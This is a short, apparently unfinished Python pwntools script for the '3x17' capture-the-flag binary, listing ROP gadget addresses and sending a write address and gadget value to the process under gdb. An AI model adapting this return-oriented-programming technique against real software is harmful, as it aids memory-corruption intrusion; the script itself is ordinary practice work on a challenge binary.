#!/usr/bin/env	python3
import pwn

# start -> 0x00401a50 
# main -> 0x00401b6d 


# syscall gadget
syscall_gadget = 0x0000000000471db5

# pop rdi gadget
pop_rdi_ret = 0x0000000000401696

# pop rsi gadget
pop_rsi_ret = 0x0000000000406c30

# pop rdx gadget
pop_rdx_ret = 0x0000000000446e35

def int64_to_bytes(shellcode):
	bytes_data = b""

	# convert to bytes from shellcode
	for data in shellcode:
		bytes_data += pwn.p64(data)
	return bytes_data

@pwn.context.quiet
def main():
	tproc = pwn.gdb.debug("./3x17", """
	break *0x0000000000401696
	""")

	# which address 
	tproc.sendline(b"4931824")
	# what data to write
	# 4201399
	print(hex(4201399))
	tproc.sendline(pwn.p64(pop_rdx_ret))
	tproc.interactive()
#
	tproc.close()

if __name__ == "__main__":
	main()
